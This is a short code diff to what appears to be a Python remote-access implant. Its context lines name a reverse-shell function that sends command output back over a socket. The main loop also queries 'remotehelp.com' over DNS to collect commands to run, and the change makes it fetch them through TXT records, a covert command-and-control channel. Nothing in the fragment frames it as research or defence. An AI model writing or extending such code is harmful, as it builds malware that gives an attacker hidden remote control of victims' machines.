@@ -66,7 +66,7 @@ def startReverseShell(HOST, PORT):
                 output = b' ' #avoid sending empty response which can cause client to hang
             s.send(output)
 
-def makeQuery(address):
+def makeQuery(address, recordType='ANY'):
     query = b'\x12\x34'  # Transaction ID
     query += b'\x01\x00'  # Flags
     query += b'\x00\x01'  # QDCOUNT
@@ -244,7 +244,7 @@ while True:
             elif(ipSplit[1] == "65"):
                 print("Collecting command to run")
                 
-                sock.sendto(makeQuery("remotehelp.com"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
+                sock.sendto(makeQuery("remotehelp.com", recordType="TXT"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
                 resp, _ = sock.recvfrom(512)
 
                 data = getResponse(resp)
